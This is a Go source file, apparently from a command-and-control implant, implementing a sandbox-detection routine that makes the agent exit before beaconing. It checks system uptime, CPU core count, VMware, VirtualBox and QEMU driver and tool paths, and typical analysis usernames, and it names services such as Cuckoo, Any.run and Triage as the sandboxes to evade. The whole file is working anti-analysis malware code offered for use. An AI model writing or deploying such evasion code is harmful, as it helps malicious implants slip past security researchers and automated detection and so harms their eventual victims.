package main

import (
	"os"
	"runtime"
	"strings"
)

// IsSandboxed detects automated analysis environments.
// Called at agent startup — if true, the agent exits before any beacon.
//
// Checks (in order):
//   1. Uptime   < 10 min  → freshly-spawned ephemeral VM
//   2. CPU cores < 2      → most sandboxes run single-core
//   3. Known sandbox filesystem paths
//   4. Known sandbox usernames (Windows env var USERNAME)
func IsSandboxed() bool {

	// ── 1. Uptime ─────────────────────────────────────────────────────────
	// getUptimeMinutes() is implemented in sandbox_windows.go (GetTickCount64)
	// and sandbox_linux.go (/proc/uptime).  Returns 0 on error → skipped.
	if uptime := getUptimeMinutes(); uptime > 0 && uptime < 10 {
		return true
	}

	// ── 2. CPU core count ─────────────────────────────────────────────────
	// Real machines almost always have >= 2 cores.
	// Cuckoo, Any.run, Triage etc. default to 1 vCPU to save hypervisor cost.
	if runtime.NumCPU() < 2 {
		return true
	}

	// ── 3. Filesystem artifacts ───────────────────────────────────────────
	sandboxPaths := []string{
		// VMware
		`C:\Program Files\VMware\VMware Tools`,
		`C:\Windows\System32\drivers\vmhgfs.sys`,
		`C:\Windows\System32\drivers\vmmouse.sys`,
		// VirtualBox
		`C:\Program Files\Oracle\VirtualBox Guest Additions`,
		`C:\Windows\System32\drivers\VBoxMouse.sys`,
		`C:\Windows\System32\drivers\VBoxGuest.sys`,
		// QEMU / KVM
		`C:\Program Files\qemu-ga`,
		`C:\Windows\System32\drivers\qxldod.sys`,
		// Sandbox user home directories
		`C:\Users\sandbox`,
		`C:\Users\malware`,
		`C:\Users\analysis`,
		`C:\Users\wdagutilityaccount`,
		// Linux equivalents (if agent runs on a Linux sandbox)
		`/proc/vmware`,
	}

	for _, p := range sandboxPaths {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}

	// ── 4. USERNAME environment variable ──────────────────────────────────
	user := strings.ToLower(os.Getenv("USERNAME"))
	sandboxUsers := []string{
		"sandbox", "malware", "analysis",
		"wdagutilityaccount", "virus", "admin", "user",
	}
	for _, u := range sandboxUsers {
		if user == u {
			return true
		}
	}

	return false
}